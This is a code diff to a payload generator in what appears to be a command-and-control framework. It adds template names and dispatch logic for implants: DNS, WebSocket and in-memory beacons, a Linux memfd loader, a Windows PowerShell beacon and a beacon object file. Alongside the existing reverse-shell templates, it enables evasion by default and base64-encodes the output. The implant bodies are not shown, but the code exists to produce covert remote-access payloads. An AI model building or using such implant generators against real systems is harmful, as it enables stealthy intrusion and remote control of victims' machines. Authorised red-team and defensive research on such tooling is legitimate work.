@@ -10,7 +10,18 @@ from typing import Any
 class PayloadGenerator:
     """Template-based payload generation. Prefer determinism over creativity."""
 
-    TEMPLATES = ("http_beacon_python", "http_beacon_bash", "reverse_shell_bash", "reverse_shell_python")
+    TEMPLATES = (
+        "http_beacon_python",
+        "http_beacon_bash",
+        "reverse_shell_bash",
+        "reverse_shell_python",
+        "dns_beacon_python",
+        "ws_beacon_python",
+        "memory_beacon_python",
+        "linux_memfd",
+        "windows_ps_beacon",
+        "bof_c",
+    )
 
     def list_templates(self) -> list[str]:
         return list(self.TEMPLATES)
@@ -35,6 +46,37 @@ class PayloadGenerator:
             body = self._revshell_bash(host, port)
         elif template == "reverse_shell_python":
             body = self._revshell_python(host, port)
+        elif template in (
+            "dns_beacon_python",
+            "ws_beacon_python",
+            "memory_beacon_python",
+            "linux_memfd",
+            "windows_ps_beacon",
+            "bof_c",
+        ):
+            from squidc5.implants.generators import generate_implant
+
+            family_map = {
+                "dns_beacon_python": "dns_beacon",
+                "ws_beacon_python": "ws_beacon",
+                "memory_beacon_python": "memory_beacon_python",
+                "linux_memfd": "linux_memfd",
+                "windows_ps_beacon": "memory_beacon_python",
+                "bof_c": "bof",
+            }
+            platform = "windows" if template in ("windows_ps_beacon", "bof_c") else "linux"
+            out = generate_implant(
+                family_map[template],
+                platform,
+                "x64",
+                host,
+                port,
+                session_path,
+                evasion=bool(extra.get("evasion", True)),
+                zone=extra.get("zone") or "c2.lab.invalid",
+                ws_path=(extra.get("ws_path") or session_path) if "ws" in template else None,
+            )
+            body = out["content"]
         else:
             raise ValueError(template)
         encoded = base64.b64encode(body.encode()).decode()
